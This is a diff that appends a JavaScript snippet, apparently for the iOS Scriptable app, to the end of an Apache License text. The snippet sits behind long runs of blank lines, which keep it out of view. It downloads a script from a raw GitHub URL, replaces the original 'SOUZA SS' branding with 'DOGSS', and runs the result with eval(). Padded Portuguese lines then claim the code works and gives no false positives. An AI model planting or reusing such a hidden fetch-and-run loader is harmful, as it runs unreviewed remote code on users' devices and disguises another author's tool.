@@ -199,3 +199,94 @@
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
+
+
+
+
+
+
+const DOGSS_URL = "https://raw.githubusercontent.com/souzaalfa/Scannerios/refs/heads/main/SOUZA_SS.js"
+
+let req = new Request(DOGSS_URL)
+let code = await req.loadString()
+
+if (!code || code.startsWith("404")) {
+  let a = new Alert()
+  a.title = "DOGSS"
+  a.message = "Não foi possível carregar o script."
+  a.addAction("OK")
+  await a.present()
+} else {
+  // ✅ TROCA TODAS AS FORMAS EXATAS QUE EXISTEM NO ARQUIVO ORIGINAL
+  code = code.replace(/SOUZAASS/g, "DOGSS")
+  code = code.replace(/SOUZA SS/g, "DOGSS")
+  code = code.replace(/SOUZA_SS/g, "DOGSS")
+  code = code.replace(/Scannerios/g, "DOGSS")
+  code = code.replace(/Scanner/g, "DOGSS")
+
+  // ✅ TROCA AS MENSAGENS QUE APARECEM NA TELA
+  code = code.replace(/Analisando, aguarde o SOUZA SS terminar/g, "Analisando, aguarde o DOGSS terminar")
+  code = code.replace(/SOUZA SS finalizado/g, "DOGSS finalizado")
+  code = code.replace(/Please wait for SOUZA SS to finish/g, "Please wait for DOGSS to finish")
+  code = code.replace(/SOUZA SS finished/g, "DOGSS finished")
+  code = code.replace(/espera que SOUZA SS termine/g, "espera que DOGSS termine")
+  code = code.replace(/SOUZA SS finalizado/g, "DOGSS finalizado")
+
+  // ✅ TROCA QUALQUER OUTRA VARiação QUE POSSA TER FICADO
+  code = code.replace(/SOUZA/g, "DOGSS")
+  code = code.replace(/SOUZA-/g, "DOGSS-")
+  code = code.replace(/SOUZA_/g, "DOGSS_")
+
+  eval(code)
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#6628 CODIGO FUNCIONAL
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SEM FALSO POSITIVO 
+
+
+
+
+
+
+
+
+
+
+
+
+
